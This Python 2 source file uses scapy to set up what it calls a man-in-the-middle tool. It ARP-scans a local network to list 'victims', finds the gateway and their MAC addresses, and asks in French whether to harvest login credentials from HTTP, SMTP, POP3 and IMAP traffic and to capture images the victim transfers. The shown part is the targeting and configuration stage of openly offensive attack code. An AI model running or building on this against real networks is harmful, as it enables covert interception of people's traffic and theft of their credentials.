# -*- coding: utf-8 -*-
from scapy.all import *
import scapy.route
from scapy.config import conf
from scapy.layers import  *
from scapy.error import Scapy_Exception
import os,sys,threading,signal

from scapy.layers.l2 import *

from  logger.colorizeStream import ColorizingStreamHandler
import logging







class MITM():

    def __init__(self):
        """
        Variables globales
        """
        self.ATTACK_INF = {}
        self.ATTACK_INF["GW_IP"] = ""
        self.ATTACK_INF["VM_IP"] = ""
        self.ATTACK_INF["IFACE"] = ""
        self.ATTACK_INF["GW_MA"] = ""
        self.ATTACK_INF["VM_MA"] = ""
        self.ATTACK_INF["HTTP_SCAN"] = False
        self.ATTACK_INF["SMTP_SCAN"] = False
        self.ATTACK_INF["PIC_SCAN"] = False
        self.ATTACK_INF["POP3_SCAN"] = False
        self.ATTACK_INF["IMAP_SCAN"] = False

# Color log
    def log_color(self):
        root = logging.getLogger()
        root.setLevel(logging.DEBUG)
        root.addHandler(ColorizingStreamHandler())
        #logging.debug('DEBUG')
        #logging.info('INFO')
        #logging.warning('WARNING')
        #logging.error('ERROR')
        #logging.critical('CRITICAL')

    def right_argument(self,input):
        if  input == "o" or input == "O":
            return True
        else:
            return False

    def network_scanner(self,cidr):
        res = ""
        unans = ""
        try:
            print "[*] Appuyez sur Ctrl+c pour arreter le scan\n "
            res, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),iface=self.ATTACK_INF["IFACE"],verbose=False,timeout=10)
            j=1
            logging.info("Liste des victimes disponibles:\n")
            for s,r in res:
                #print  es[ARP]
                if r[ARP].psrc == self.ATTACK_INF["GW_IP"] :
                    self.ATTACK_INF["GW_MA"] =r[Ether].src
                else:
                    print "Target: "+str(j)+" > Adresse Mac : "+r[Ether].src+"    Adresse Ip : "+r[ARP].psrc+"\n"
                    j = j + 1


            #res.summary(lambda (s, r): r.sprintf("Target: > Adresse Mac : %Ether.src%    Adresse ip : %ARP.psrc%") )
            logging.info("Informations sur la Gateway :")
            print "\n[*] Ip Gateway(Router) : "+self.ATTACK_INF["GW_IP"]+"    Mac Gateway(Router) : "+self.ATTACK_INF["GW_MA"]+"\n"
            self.ATTACK_INF["VM_IP"] = raw_input("Veuillez-choisir un target parmi ceux de la liste :")
            self.ATTACK_INF["VM_MA"] = self.get_mac(self.ATTACK_INF["VM_IP"])

        except KeyboardInterrupt:
            if res:
                res.summary(lambda (s, r): r.sprintf("%Ether.src% %ARP.psrc%"))
            else:
                logging.error("Le scanner n'a pas eu le temps de récuperer les targets!!")
                sys.exit(1)


    def find_GW(self):
        try:
            iff,ip,gw = conf.route.route("0.0.0.0")
            if(iff == self.ATTACK_INF["IFACE"]):
                self.ATTACK_INF["GW_IP"] = gw
            else:
                logging.error("L'adresse ip de la Gateway est introuvable!!")
        except Exception:
            logging.error("Find Gateway fonction: "+Exception.message)
            sys.exit(1)

    def get_mac(self,ip_address):
        response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_address), \
                                       timeout=2, retry=10,verbose=False)
        for s, r in response:
            return r[Ether].src
        return None

 # Intercept user choices
    def get_targets_informations(self):
        print "[*] Mitm roughiz tool\n "
        scan = raw_input("Voulez-vous scanner le réseau local pour trouver des cibles? (O/N) : ")
        self.ATTACK_INF["IFACE"] = raw_input("Veuillez-choisir le nom de l'interface :")
        arg  = raw_input("Voulez-vous scanner le protocol HTTP en vue de trouver des info d'authentifications? (O/N) : ")
        self.ATTACK_INF["HTTP_SCAN"] = self.right_argument(arg)
        arg  = raw_input("Voulez-vous scanner le protocol SMTP en vue de trouver des info d'authentifications? (O/N) : ")
        self.ATTACK_INF["SMTP_SCAN"] = self.right_argument(arg)
        arg  = raw_input("Voulez-vous scanner le protocol POP3 en vue de trouver des info d'authentifications? (O/N) : ")
        self.ATTACK_INF["POP3_SCAN"] =  self.right_argument(arg)
        arg  = raw_input("Voulez-vous scanner le protocol IMAP en vue de trouver des info d'authentifications? (O/N) : ")
        self.ATTACK_INF["IMAP_SCAN"] =  self.right_argument(arg)
        arg = raw_input("Voulez-vous récupérer les images qui transit de la victime? (O/N) : ")
        self.ATTACK_INF["PIC_SCAN"] =  self.right_argument(arg)

        if scan == "o" or scan == "O":
            self.find_GW()
            cidr = raw_input("Veuillez-entrer le CIDR pour le scan, par exemple 192.168.3.5/16 :")
            return  self.network_scanner(cidr)
        else:
            self.ATTACK_INF["GW_IP"] = raw_input("Veuillez-entrer l'adresse ip de la Gateway :")
            self.ATTACK_INF["VM_IP"] = raw_input("Veuillez-entrer l'adresse ip de la victime :")
            return self.ATTACK_INF



